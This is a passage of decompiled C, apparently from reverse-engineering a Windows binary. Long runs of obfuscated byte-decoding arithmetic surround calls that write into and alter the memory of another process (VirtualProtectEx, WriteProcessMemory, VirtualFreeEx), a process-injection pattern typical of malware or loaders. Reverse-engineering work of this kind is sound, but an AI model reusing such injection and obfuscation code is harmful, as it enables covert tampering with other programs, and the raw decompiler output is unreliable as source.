                bVar15 = bVar2 + cVar10 + (cVar10 + 0xbaU & bVar2) * -2 + 0xa4;
                goto LAB_1400152e2;
              }
              if (uVar14 == uVar13 + 1) {
                bVar15 = ('4' - (cVar10 + 0x44U & bVar2)) * '\x02' + cVar10 + bVar2;
                goto LAB_140015c22;
              }
              if (uVar14 == uVar13 + 0x40) {
                bVar15 = ('\x16' - (cVar10 - 0x32U & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar14 = uVar14 + uVar13;
                goto LAB_140015c5a;
              }
              if (uVar14 == uVar13 + 0x2a) {
                bVar15 = (bVar2 + cVar10 + (cVar10 + 0x58U & bVar2) * -2) - 0x10;
                goto LAB_140015c5a;
              }
              if (uVar14 == uVar13 + 0x28) {
                bVar15 = bVar2 + cVar10 + (cVar10 - 0x1eU & bVar2) * -2 + 0xb4;
                goto LAB_140015c8c;
              }
              if (uVar14 == uVar13 + 0x5a) {
                bVar15 = ('<' - (cVar10 + 0x6cU & bVar2)) * '\x02' + cVar10 + bVar2;
                goto LAB_140015cb2;
              }
              if (uVar14 == uVar13 + 0x20) {
                bVar15 = ('\x1e' - (cVar10 - 10U & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar11 = uVar11 + (byte)local_1f8[uVar11 + 0x20] + uVar13 + 1;
                goto LAB_1400152e2;
              }
              uVar7 = uVar13;
            } while (uVar14 == uVar13 + 0x41);
            uVar14 = uVar13 + 0x61;
            uVar7 = uVar13 + 0x71;
            if (uVar14 < uVar13 + 0x7a) {
              local_120[0] = ('\x13' - (cVar10 + 0x4fU & bVar2)) * '\x02' + cVar10 + bVar2;
              goto LAB_1400152d0;
            }
            if (uVar14 < uVar13 + 0x1071) {
              local_120[0] = (bVar2 + cVar10 + (cVar10 - 0x27U & bVar2) * -2) - 0x16;
              goto LAB_1400152e0;
            }
            if (uVar14 < uVar13 + 0x79) {
              bVar15 = cVar10 + (cVar10 + 99U & bVar2) * -2 + -0x52 + bVar2;
              uVar13 = uVar7;
              goto LAB_1400152f6;
            }
            if (uVar14 < uVar13 + 0x471) {
              bVar15 = ('9' - (cVar10 - 0x13U & bVar2)) * '\x02' + cVar10 + bVar2;
              uVar13 = uVar7;
              goto LAB_140015360;
            }
            if (uVar14 < uVar13 + 0x77) break;
            if (uVar14 < uVar13 + 0x459) {
              cVar16 = cVar10 + (cVar10 + 1U & bVar2) * -2 + -6;
              uVar13 = uVar7;
              goto LAB_140015795;
            }
            if (uVar14 < uVar13 + 0x76) {
              cVar16 = cVar10 + (cVar10 + 0x8bU & bVar2) * -2 + -0x42;
              uVar13 = uVar7;
              goto LAB_140015752;
            }
            if (uVar14 < uVar13 + 0x271) {
              cVar16 = cVar10 + (cVar10 + 0x15U & bVar2) * -2 + -0x7e;
              uVar13 = uVar7;
              goto LAB_140015719;
            }
            if (uVar14 < uVar13 + 0x75) {
              bVar15 = ('#' - (cVar10 + 0x9fU & bVar2)) * '\x02' + cVar10 + bVar2;
              uVar13 = uVar7;
              goto LAB_1400156f9;
            }
            if (uVar13 + 0xf1 <= uVar14) {
              uVar14 = uVar13 + 0xb3;
              uVar7 = uVar13 + 0xb6;
              if (uVar13 + 0xb7 < uVar14) {
                bVar15 = ('\x18' - (cVar10 - 8U & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar11 = uVar11 + (byte)local_1f8[uVar11 + 0x20] + uVar7 + 1;
                uVar13 = uVar7;
                goto LAB_1400152e2;
              }
              if (uVar13 + 0xf6 < uVar14) {
                bVar15 = (bVar2 + cVar10 + (cVar10 + 0x82U & bVar2) * -2) - 0xc;
                uVar13 = uVar7;
                goto LAB_140015cb2;
              }
              if (uVar13 + 0xe0 < uVar14) {
                bVar15 = bVar2 + cVar10 + (cVar10 + 0xcU & bVar2) * -2 + 0xb8;
                uVar13 = uVar7;
                goto LAB_140015c8c;
              }
              if (uVar13 + 0xde < uVar14) {
                bVar15 = ('>' - (cVar10 + 0x96U & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar13 = uVar7;
                goto LAB_140015c5a;
              }
              if (uVar13 + 0x110 < uVar14) {
                bVar15 = (' ' - (cVar10 + 0x20U & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar14 = uVar14 + uVar7;
                uVar13 = uVar7;
                goto LAB_140015c5a;
              }
              if (uVar13 + 0xd6 < uVar14) {
                bVar15 = ('\x02' - (cVar10 + 0xaaU & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar13 = uVar7;
                goto LAB_140015c22;
              }
              if (uVar13 + 0xf7 < uVar14) {
                bVar15 = (bVar2 + cVar10 + (cVar10 + 0x34U & bVar2) * -2) - 0x38;
                uVar13 = uVar7;
                goto LAB_1400152e2;
              }
              if (uVar13 + 0xc6 < uVar14) {
                bVar15 = bVar2 + cVar10 + (cVar10 + 0xbeU & bVar2) * -2 + 0x8c;
                uVar13 = uVar13 + 0xb7;
                goto LAB_1400152e2;
              }
              if (uVar13 + 0x130 < uVar14) {
                cVar16 = ('(' - (cVar10 + 0x48U & bVar2)) * '\x02' + cVar10;
                uVar13 = uVar7;
                goto LAB_140015bde;
              }
              if (uVar14 <= uVar13 + 0xc0) {
                uVar14 = uVar13 + 0xbe;
                uVar7 = uVar13 + 0x11f;
              }
            }
          }
          bVar15 = ('\x1b' - (cVar10 + 0x77U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar7;
        }
        if (uVar14 < uVar13 + 0x80) {
          cVar16 = ('1' - (cVar10 + 0x45U & bVar2)) * '\x02' + cVar10;
LAB_140015795:
          bVar15 = cVar16 + bVar2;
LAB_140015798:
          if (uVar14 + uVar13 != 0x7a) {
            if (uVar13 + 0x1000 < uVar14) {
              cVar16 = ('-' - (cVar10 + 0x71U & bVar2)) * '\x02' + cVar10;
LAB_140015752:
              bVar15 = cVar16 + bVar2;
LAB_140015755:
              if (99 < uVar14) {
                bVar15 = (bVar2 * '\x02' + cVar10 + (cVar10 + 8U & bVar2) * -2) - 0x30;
LAB_140015c22:
                local_1f8[uVar11 + 0x20] =
                     bVar2 + (bVar2 & cVar10 + 0x4dU) * -2 + -0x1b + cVar10 + 0x4dU + bVar15;
                uVar14 = uVar14 + uVar13;
                goto LAB_140015c5a;
              }
              if (uVar13 + 0x40 < uVar14) {
                cVar16 = ('2' - (cVar10 + 0x1aU & bVar2)) * '\x02' + cVar10;
LAB_140015719:
                bVar15 = cVar16 + bVar2;
              }
              else {
                if (uVar14 == uVar13 + 1) {
                  bVar15 = ('\x14' - (cVar10 + 0xa4U & bVar2)) * '\x02' + cVar10 + bVar2;
                  uVar11 = uVar11 + (byte)local_1f8[uVar11 + 0x20] + uVar13 + 1;
                  goto LAB_1400152e2;
                }
                if (uVar14 == uVar13 + 5) {
                  bVar15 = (bVar2 + cVar10 + (cVar10 + 0x56U & bVar2) * -2) - 4;
                  goto LAB_140015c22;
                }
                if (uVar14 == uVar13 + 4) {
                  bVar15 = (bVar2 + cVar10 + (cVar10 - 0x20U & bVar2) * -2) - 0x40;
                  goto LAB_1400152e2;
                }
                if (uVar14 == uVar13 + 3) {
                  bVar15 = bVar2 + cVar10 + (cVar10 + 0x6aU & bVar2) * -2 + 0x84;
                  uVar13 = uVar13 + 1;
                  goto LAB_1400152e2;
                }
                if (uVar14 == uVar13 + 8) {
                  cVar16 = ('$' - (cVar10 - 0xcU & bVar2)) * '\x02' + cVar10;
                  goto LAB_140015bde;
                }
              }
              if (uVar13 < 9) {
LAB_1400156f9:
                local_1f8[uVar11 + 0x20] = bVar15;
                uVar11 = uVar11 + 1;
                goto LAB_1400152e2;
              }
              bVar15 = (('\x06' - (cVar10 + 0x7eU & bVar2)) * '\x02' + cVar10 + bVar2) * '\x02';
            }
            else {
              if (uVar14 != uVar13 + 1) {
                if (uVar14 == uVar13 + 3) {
                  bVar15 = (bVar2 + cVar10 + (cVar10 + 0xadU & bVar2) * -2) - 0xe;
                  goto LAB_140015c5a;
                }
                if (uVar14 == uVar13 + 5) {
                  bVar15 = bVar2 + cVar10 + (cVar10 + 0x37U & bVar2) * -2 + 0xb6;
                  goto LAB_140015c8c;
                }
                if (uVar14 != uVar13 + 4) goto LAB_140015755;
                bVar15 = ('\x1f' - (cVar10 + 0x4bU & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar11 = uVar11 + (byte)local_1f8[uVar11 + 0x20] + uVar13 + 1;
                goto LAB_1400152e2;
              }
              cVar16 = ('\x0f' - (cVar10 - 5U & bVar2)) * '\x02' + cVar10;
LAB_140015bde:
              bVar15 = cVar16 + bVar2;
            }
LAB_140015be1:
            local_1f8[uVar11 + 0x20] =
                 bVar2 + (bVar2 & cVar10 - 0x3dU) * -2 + -0x55 + (cVar10 - 0x3dU);
            uVar13 = uVar13 + 1;
            goto LAB_1400152e2;
          }
          bVar15 = cVar10 + (cVar10 + 0x92U & bVar2) * -2 + 0x94;
LAB_140015c8c:
          bVar5 = bVar2 + (bVar2 & cVar10 - 0x29U) * -2 + '\x1f' + (cVar10 - 0x29U);
          local_1f8[uVar11 + 0x20] = bVar5;
          uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
          uVar13 = uVar13 + 1;
        }
        else {
          if (uVar14 == uVar13 + 1) {
            bVar15 = ('\n' - (cVar10 + 0x52U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar11 = uVar11 + (byte)local_1f8[uVar11 + 0x20] + uVar13 + 1;
            goto LAB_1400152e2;
          }
          if (uVar14 != uVar13 + 2) {
            if (uVar14 == uVar13 + 3) {
              bVar15 = ('0' - (cVar10 - 0x10U & bVar2)) * '\x02' + cVar10 + bVar2;
              goto LAB_140015c5a;
            }
            if (uVar14 != uVar13 + 5) {
              if (uVar14 == uVar13 + 8) {
                cVar16 = ('\x1a' - (cVar10 + 0xa2U & bVar2)) * '\x02' + cVar10;
                goto LAB_140015bde;
              }
              goto LAB_140015798;
            }
            bVar15 = bVar2 + cVar10 + (cVar10 + 0x8eU & bVar2) * -2 + 0xac;
            goto LAB_1400152e2;
          }
          bVar15 = (bVar2 + cVar10 + (cVar10 - 0x24U & bVar2) * -2) - 0x28;
        }
LAB_140015cb2:
        bVar5 = (char)uVar11 + 0x1c;
        local_1f8[uVar11 + 0x20] = ('\x1e' - (bVar2 & bVar5)) * '\x02' + bVar2 + bVar5;
        uVar14 = uVar14 + 1;
        lVar18 = uVar11 + (-1 - uVar14);
        uVar11 = lVar18 + (byte)local_1f8[lVar18 + 0x20] + uVar13 + 1;
        goto LAB_1400152e2;
      }
    }
    else {
      in_stack_017cc1c9 = local_1d8;
    }
LAB_140015d62:
    VirtualProtectEx(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),local_58,
                     lStack_c0 - (longlong)local_c8,in_stack_017cc1c9,(PDWORD)&DAT_140a619a8);
    WriteProcessMemory(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),local_58,local_c8,
                       lStack_c0 - (longlong)local_c8,(SIZE_T *)0x0);
    local_e0 = local_58;
    WriteProcessMemory(hProcess,(LPVOID)((longlong)lpAddress + 8),&local_e0,8,(SIZE_T *)0x0);
    local_d8 = lpAddress;
    WriteProcessMemory(hProcess,lpBaseAddress,&local_d8,8,(SIZE_T *)0x0);
    do {
      local_120[0] = 0;
      ReadProcessMemory(hProcess,(LPCVOID)((longlong)lpBaseAddress_00 + 0x10),local_120,1,
                        (SIZE_T *)0x0);
    } while (local_120[0] == 0);
    local_d0 = lVar12;
    WriteProcessMemory(hProcess,lpBaseAddress,&local_d0,8,(SIZE_T *)0x0);
    local_1b8 = 0x7372ed6c;
    local_1b4 = 0;
    uStack_1ac = 0;
    local_1a4 = 0;
    local_19c = 0;
    bVar15 = local_120[0];
LAB_140015eb0:
    uVar14 = DAT_140a618c8;
    uVar7 = DAT_140a618d0;
LAB_140015ec0:
    uVar17 = 0;
    uVar13 = uVar14;
    uVar11 = uVar7;
LAB_140015ec3:
    if (uVar17 < 0x1d) {
      bVar2 = *(byte *)((longlong)local_148 + (uVar17 - 0x70));
LAB_140015ed6:
      if (uVar13 <= uVar17) {
        cVar10 = (char)uVar17;
        if (uVar13 < uVar11 + 1) goto code_r0x000140015ee8;
        if (uVar13 == uVar11 + 1) {
          bVar15 = (bVar2 + cVar10 + 0x2aU + (cVar10 + 0x2aU & bVar2) * -2) - 0x26;
          uVar17 = uVar17 + *(byte *)((longlong)local_148 + (uVar17 - 0x70)) + uVar11 + 1;
        }
        else {
          if (uVar13 == uVar11 + 2) {
            cVar16 = (')' - (cVar10 + 0x62U & bVar2)) * '\x02' + cVar10 + 0x62U;
LAB_140016833:
            bVar15 = cVar16 + bVar2;
            goto LAB_140016836;
          }
          if (uVar13 == uVar11 + 4) {
            bVar15 = (bVar2 + cVar10 + 0x9aU + (cVar10 + 0x9aU & bVar2) * -2) - 0x36;
LAB_140016800:
            uVar13 = uVar13 + uVar11;
            goto LAB_140016803;
          }
          if (uVar13 != uVar11 + 7) {
            if (uVar13 != uVar11 + 9) goto LAB_140015f40;
            cVar16 = cVar10 + (cVar10 + 10U & bVar2) * -2 + -0x3c;
            goto LAB_14001679e;
          }
          bVar15 = cVar10 - 0x2e;
          cVar16 = '\n';
LAB_1400167d2:
          bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
        }
        goto LAB_140015ec3;
      }
    }
    else {
      in_stack_011772be = local_1b8;
    }
LAB_14001691e:
    VirtualFreeEx(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),lpAddress,0,
                  in_stack_011772be);
    local_198 = 0xdbda59d8;
    local_194 = 0;
    uStack_18c = 0;
    local_184 = 0;
    bVar15 = local_120[0];
LAB_140016970:
    uVar14 = DAT_140a618c8;
    uVar7 = DAT_140a618d0;
LAB_140016980:
    uVar17 = (ulonglong)bVar15;
    uVar11 = 0;
    uVar13 = uVar7;
LAB_140016983:
    if (uVar11 < 0x15) {
      bVar2 = *(byte *)((longlong)local_148 + (uVar11 - 0x50));
      bVar15 = (byte)uVar11;
LAB_1400169a0:
      if (uVar14 <= uVar11) {
        if (uVar14 < uVar13 + 1) goto code_r0x0001400169b2;
        if (uVar14 == uVar13 + 1) {
          uVar17 = (ulonglong)(byte)((bVar15 + 0x94 + bVar2 + (bVar2 & bVar15 + 0x94) * -2) - 0xc);
          uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar13 + 1;
        }
        else {
          if (uVar14 == uVar13 + 3) {
            bVar5 = bVar15 + 0x2c;
            cVar10 = bVar2 + (bVar2 & bVar5) * -2 + -0x34;
LAB_1400173bc:
            uVar17 = (ulonglong)(byte)(cVar10 + bVar5);
            *(byte *)((longlong)local_148 + (uVar11 - 0x50)) =
                 ('.' - (bVar2 & bVar15 + 0x3c)) * '\x02' + bVar2 + cVar10 + bVar5 + bVar15 + 0x3c;
LAB_1400173e3:
            uVar14 = uVar14 + uVar13;
            goto LAB_1400173e6;
          }
          if (uVar14 == uVar13 + 7) {
            uVar17 = (ulonglong)(byte)(bVar15 + bVar2 + (bVar15 - 0x1c & bVar2) * -2 + 0xa8);
          }
          else {
            if (uVar14 != uVar13 + 4) goto LAB_1400169f8;
            uVar17 = (ulonglong)(byte)((',' - (bVar15 + 0x9c & bVar2)) * '\x02' + bVar2 + bVar15);
            uVar13 = uVar13 + 1;
          }
        }
        goto LAB_140016983;
      }
    }
    else {
      in_stack_00763d14 = local_198;
    }
LAB_14001747c:
    VirtualFreeEx(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),lpBaseAddress_00,0,
                  in_stack_00763d14);
    uVar9 = 1;
    FUN_14000fbd0(local_78);
    FUN_14000e3a0(&local_c8);
    goto LAB_1400174b3;
  }
  bVar2 = *(byte *)((longlong)&local_2b8 + uVar11);
LAB_1400110f3:
  if (uVar11 < uVar14) goto LAB_140011c3b;
  cVar10 = (char)uVar11;
  if (uVar13 + 1 <= uVar14) {
    if (uVar14 == uVar13 + 1) {
      bVar15 = (bVar2 + cVar10 + 0x27U + (cVar10 + 0x27U & bVar2) * -2) - 0x11;
      uVar11 = uVar11 + *(byte *)((longlong)&local_2b8 + uVar11) + uVar13 + 1;
    }
    else {
      if (uVar14 == uVar13 + 2) {
        bVar15 = bVar2 + cVar10 + 0x41U + (cVar10 + 0x41U & bVar2) * -2 + 0x39;
        goto LAB_140011b82;
      }
      if (uVar14 == uVar13 + 3) {
        bVar15 = (bVar2 + cVar10 + 0x75U + (cVar10 + 0x75U & bVar2) * -2) - 0x33;
        goto LAB_140011b53;
      }
      if (uVar14 == uVar13 + 2) {
        bVar15 = cVar10 + 0x8fU + bVar2 + (bVar2 & cVar10 + 0x8fU) * -2 + 0x17;
        uVar14 = uVar14 + uVar13;
        goto LAB_140011b53;
      }
      if (uVar14 == uVar13 + 5) {
        bVar15 = bVar2 + (bVar2 & cVar10 + 0xa9U) * -2 + 'a' + cVar10 + 0xa9U;
        goto LAB_140011afd;
      }
      if (uVar14 != uVar13 + 6) goto LAB_140011167;
      bVar15 = cVar10 - 0x3d;
      cVar16 = '7';
LAB_140011ac9:
      bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
    }
    goto LAB_1400110e3;
  }
  bVar15 = bVar2 + (bVar2 & cVar10 + 0xdU) * -2 + -0x5b + cVar10 + 0xdU;
LAB_140011167:
  if (uVar11 < uVar13) {
    in_stack_01731511 = in_stack_0144ea04;
    goto LAB_140011c3b;
  }
  if (uVar13 + 0x400 <= uVar14) {
    if (uVar14 == uVar13 + 1) {
      cVar16 = cVar10 + (cVar10 + 0x2bU & bVar2) * -2 + -2;
      goto LAB_140011a96;
    }
    if (uVar14 != uVar13 + 2) {
      if (uVar14 == uVar13 + 4) {
        bVar15 = (bVar2 + cVar10 + 0x93U + (cVar10 + 0x93U & bVar2) * -2) - 5;
        uVar14 = uVar14 + uVar13;
      }
      else {
        if (uVar14 != uVar13 + 3) {
          if (uVar14 != uVar13 + 2) goto LAB_1400111e0;
          bVar15 = cVar10 - 0x39;
          cVar16 = '+';
          goto LAB_1400119ea;
        }
        bVar15 = bVar2 + cVar10 + 0xadU + (cVar10 + 0xadU & bVar2) * -2 + 0x45;
      }
      goto LAB_140011b53;
    }
    bVar15 = ('1' - (cVar10 + 0x45U & bVar2)) * '\x02' + cVar10 + bVar2;
    uVar13 = uVar13 + 1;
    goto LAB_1400110e3;
  }
  bVar15 = cVar10 + (cVar10 + 0x11U & bVar2) * -2 + -0x66 + bVar2;
LAB_1400111e0:
  while (uVar7 = uVar13, uVar11 < uVar13 + uVar14) {
    while( true ) {
      do {
        uVar13 = uVar7;
        if (uVar14 == uVar13 + 5) {
          cVar16 = ('>' - (cVar10 + 0x96U & bVar2)) * '\x02' + cVar10;
          goto LAB_140011a96;
        }
        if (uVar14 == uVar13 + 100) {
          bVar15 = cVar10 + (cVar10 + 0xb0U & bVar2) * -2 + -0x20 + bVar2;
          uVar13 = uVar13 + 1;
          goto LAB_1400110e3;
        }
        if (uVar14 == uVar13 + 10) {
          bVar15 = cVar10 - 0x36;
          cVar16 = '\"';
          goto LAB_140011ac9;
        }
        if (uVar14 == uVar13 + 0x400) {
          bVar15 = cVar10 + (cVar10 - 0x1cU & bVar2) * -2 + -0x58 + bVar2;
          goto LAB_140011afd;
        }
        if (uVar14 == uVar13 + 4) {
          bVar15 = ('\x06' - (cVar10 - 2U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar14 + uVar13;
          goto LAB_140011b53;
        }
        if (uVar14 == uVar13 + 0x42) {
          bVar15 = ('8' - (cVar10 + 0x18U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140011b53;
        }
        if (uVar14 == uVar13 + 9) {
          cVar16 = cVar10 + (cVar10 + 0x32U & bVar2) * -2 + -0x2c;
          goto LAB_1400119f6;
        }
        if (uVar14 == uVar13 + 1000) {
          bVar15 = ('\x1c' - (cVar10 + 0x4cU & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140011b82;
        }
        if (uVar14 == uVar13 + 3) {
          bVar15 = cVar10 + (cVar10 + 0x66U & bVar2) * -2 + -100 + bVar2;
          uVar11 = uVar11 + *(byte *)((longlong)&local_2b8 + uVar11) + uVar13 + 1;
          goto LAB_1400110e3;
        }
        uVar7 = uVar13;
      } while (uVar14 == uVar13 + 0x40);
      uVar14 = uVar13 + 0x10;
      uVar7 = uVar13 + 0x18;
      if (uVar14 < uVar13 + 0x1018) {
        bVar15 = ('\v' - (cVar10 + 0xa7U & bVar2)) * '\x02' + bVar2 + cVar10;
        goto LAB_1400110d0;
      }
      if (uVar14 < uVar13 + 0x5a) {
        bVar15 = ('=' - (cVar10 - 0x3fU & bVar2)) * '\x02' + bVar2 + cVar10;
        goto LAB_1400110e0;
      }
      if (uVar14 < uVar13 + 0x72) {
        bVar15 = cVar10 + (cVar10 - 0x25U & bVar2) * -2 + -0x22 + bVar2;
        uVar13 = uVar7;
        goto LAB_1400110f3;
      }
      if (uVar14 < uVar13 + 0x22) {
        bVar15 = ('!' - (cVar10 - 0xbU & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar13 = uVar7;
        goto LAB_140011167;
      }
      if (uVar14 < uVar13 + 0x418) break;
      if (uVar14 < uVar13 + 0x58) {
        cVar16 = ('\x05' - (cVar10 + 0x29U & bVar2)) * '\x02' + cVar10;
        uVar13 = uVar7;
        goto LAB_1400115b4;
      }
      if (uVar14 < uVar13 + 0x59) {
        bVar15 = cVar10 + 0x43;
        cVar16 = '7';
        uVar13 = uVar7;
        goto LAB_140011562;
      }
      if (uVar14 < uVar13 + 0x21) {
        cVar16 = cVar10 + (cVar10 + 0x5dU & bVar2) * -2 + -0x2e;
        uVar13 = uVar7;
        goto LAB_14001152e;
      }
      if (uVar14 < uVar13 + 0x400) {
        bVar15 = ('\x1b' - (cVar10 + 0x77U & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar13 = uVar7;
        goto LAB_14001150d;
      }
      if (uVar13 + 0x40 <= uVar14) {
        uVar14 = uVar13 + 0x42;
        uVar7 = uVar13 + 0xbc;
        if (uVar13 + 0xcc < uVar14) {
          bVar15 = cVar10 + (cVar10 + 0xb8U & bVar2) * -2 + -0x50 + bVar2;
          uVar11 = uVar11 + *(byte *)((longlong)&local_2b8 + uVar11) + uVar7 + 1;
          uVar13 = uVar7;
          goto LAB_1400110e3;
        }
        if (uVar13 + 0xc0 < uVar14) {
          bVar15 = ('\n' - (cVar10 - 0x2eU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar7;
          goto LAB_140011b82;
        }
        if (uVar13 + 0xfe < uVar14) {
          bVar15 = cVar10 - 0x14;
          cVar16 = '<';
          uVar13 = uVar7;
          goto LAB_1400119ea;
        }
        if (uVar13 + 0x116 < uVar14) {
          bVar15 = cVar10 + (cVar10 + 6U & bVar2) * -2 + -0x24 + bVar2;
          uVar13 = uVar7;
          goto LAB_140011b53;
        }
        if (uVar13 + 0x4a4 < uVar14) {
          bVar15 = (' ' - (cVar10 + 0x20U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar14 + uVar7;
          uVar13 = uVar7;
          goto LAB_140011b53;
        }
        if (uVar13 + 0xbf < uVar14) {
          bVar15 = cVar10 + (cVar10 + 0x3aU & bVar2) * -2 + -0x5c + bVar2;
          uVar13 = uVar7;
          goto LAB_140011afd;
        }
        if (uVar13 + 0xfc < uVar14) {
          bVar15 = cVar10 + 0x54;
          cVar16 = '\x04';
          uVar13 = uVar7;
          goto LAB_140011ac9;
        }
        if (uVar13 + 0xfd < uVar14) {
          bVar15 = ('6' - (cVar10 + 0x6eU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar13 + 0xbd;
          goto LAB_1400110e3;
        }
        if (uVar13 + 700 < uVar14) {
          cVar16 = cVar10 + (cVar10 + 0x88U & bVar2) * -2 + -0x30;
          uVar13 = uVar7;
          goto LAB_140011a96;
        }
        if (uVar14 <= uVar13 + 0xbe) {
          uVar14 = uVar13 + 0x120;
          uVar7 = uVar13 + 0x148;
        }
      }
    }
    bVar15 = cVar10 + (cVar10 + 0xfU & bVar2) * -2 + -0x5a + bVar2;
    uVar13 = uVar7;
  }
  if (uVar14 < uVar13 + 0x61) {
    cVar16 = cVar10 + (cVar10 + 0xdU & bVar2) * -2 + -0x4e;
LAB_1400115b4:
    bVar15 = cVar16 + bVar2;
LAB_1400115b7:
    if (uVar13 + uVar14 != 1) {
      if (uVar14 <= uVar13 + 0x42) {
        if (uVar14 != uVar13 + 1) {
          if (uVar14 == uVar13 + 4) {
            bVar15 = ('/' - (cVar10 + 0x9bU & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar14 = uVar14 + uVar13;
            goto LAB_140011b53;
          }
          if (uVar14 == uVar13 + 3) {
            bVar15 = cVar10 + (cVar10 + 0xb5U & bVar2) * -2 + -0x3e + bVar2;
            goto LAB_140011b53;
          }
          if (uVar14 == uVar13 + 7) {
            bVar15 = cVar10 + (cVar10 + 3U & bVar2) * -2 + -0x12 + bVar2;
            uVar11 = uVar11 + *(byte *)((longlong)&local_2b8 + uVar11) + uVar13 + 1;
            goto LAB_1400110e3;
          }
          goto LAB_14001156e;
        }
        cVar16 = cVar10 + (cVar10 + 0x33U & bVar2) * -2 + -0x32;
LAB_140011a96:
        bVar15 = cVar16 + bVar2;
LAB_140011a99:
        *(byte *)((longlong)&local_2b8 + uVar11) =
             cVar10 + 0x3bU + (cVar10 + 0x3bU & bVar2) * -2 + 'c' + bVar2;
        uVar13 = uVar13 + 1;
        goto LAB_1400110e3;
      }
      bVar15 = cVar10 + 0x19;
      cVar16 = '5';
LAB_140011562:
      bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_14001156e:
      if (uVar14 < 0x80) {
        if (uVar13 + 4 < uVar14) {
          cVar16 = ('\x02' - (cVar10 + 0x2aU & bVar2)) * '\x02' + cVar10;
LAB_14001152e:
          bVar15 = cVar16 + bVar2;
        }
        else {
          if (uVar14 == uVar13 + 1) {
            bVar15 = ('4' - (cVar10 + 0x44U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar11 = uVar11 + *(byte *)((longlong)&local_2b8 + uVar11) + uVar13 + 1;
            goto LAB_1400110e3;
          }
          if (uVar14 == uVar13 + 2) {
            bVar15 = cVar10 + (cVar10 + 0x5eU & bVar2) * -2 + -0x34 + bVar2;
            goto LAB_140011b82;
          }
          if (uVar14 == uVar13 + 2) {
            bVar15 = cVar10 + 0x78;
            cVar16 = '\x18';
LAB_1400119ea:
            cVar16 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10;
            goto LAB_1400119f6;
          }
          if (uVar14 == uVar13 + 4) {
            bVar15 = cVar10 + (cVar10 + 0x92U & bVar2) * -2 + -0x6c + bVar2;
            goto LAB_140011b53;
          }
          if (uVar14 == uVar13 + 3) {
            bVar15 = cVar10 + (cVar10 + 0xacU & bVar2) * -2 + -8 + bVar2;
            uVar14 = uVar14 + uVar13;
            goto LAB_140011b53;
          }
          if (uVar14 == uVar13 + 8) {
            cVar16 = cVar10 + (cVar10 + 0x14U & bVar2) * -2 + -0x78;
            goto LAB_140011a96;
          }
        }
        if (uVar13 < 6) {
LAB_14001150d:
          *(byte *)((longlong)&local_2b8 + uVar11) = bVar15;
          uVar11 = uVar11 + 1;
          goto LAB_1400110e3;
        }
        bVar15 = (cVar10 + (cVar10 + 0x2eU & bVar2) * -2 + bVar2) * '\x02' - 0x28;
        goto LAB_140011a99;
      }
      bVar15 = ('(' - (cVar10 + 0x48U & bVar2)) * '\x02' + cVar10 + bVar2 * '\x02';
LAB_140011afd:
      *(byte *)((longlong)&local_2b8 + uVar11) =
           bVar15 + (cVar10 + 0x55U & bVar2) * -2 + -0x53 + cVar10 + 0x55U + bVar2;
      uVar14 = uVar14 + uVar13;
LAB_140011b53:
      uVar11 = uVar11 - bVar15;
      goto LAB_1400110e3;
    }
    bVar15 = cVar10 + (cVar10 + 0x62U & bVar2) * -2 + 0xb4;
  }
  else {
    if (uVar14 == uVar13 + 1) {
      bVar15 = ('\x1a' - (cVar10 + 0x22U & bVar2)) * '\x02' + cVar10 + bVar2;
      uVar11 = uVar11 + *(byte *)((longlong)&local_2b8 + uVar11) + uVar13 + 1;
      goto LAB_1400110e3;
    }
    if (uVar14 == uVar13 + 2) {
      bVar15 = cVar10 + (cVar10 + 0x3cU & bVar2) * -2 + -0x68 + bVar2;
      goto LAB_140011b82;
    }
    if (uVar14 != uVar13 + 2) {
      if (uVar14 == uVar13 + 5) {
        bVar15 = cVar10 + (cVar10 + 0x8aU & bVar2) * -2 + -0x3c + bVar2;
        uVar14 = uVar14 + uVar13;
        goto LAB_140011b53;
      }
      if (uVar14 != uVar13 + 3) {
        if (uVar14 == uVar13 + 6) {
          bVar15 = cVar10 + (cVar10 + 0xbeU & bVar2) * -2 + -0x74 + bVar2;
          goto LAB_1400110e3;
        }
        if (uVar14 != uVar13 + 9) goto LAB_1400115b7;
        cVar16 = ('*' - (cVar10 - 0xeU & bVar2)) * '\x02' + cVar10;
        goto LAB_140011a96;
      }
      bVar15 = ('\x14' - (cVar10 + 0xa4U & bVar2)) * '\x02' + cVar10 + bVar2;
      goto LAB_140011afd;
    }
    cVar16 = cVar10 + (cVar10 + 0x56U & bVar2) * -2 + -4;
LAB_1400119f6:
    bVar15 = cVar16 + bVar2;
  }
  bVar5 = cVar10 + 0x6fU + (cVar10 + 0x6fU & bVar2) * -2 + -9 + bVar2;
  *(byte *)((longlong)&local_2b8 + uVar11) = bVar5;
  uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
  uVar13 = uVar13 + 1;
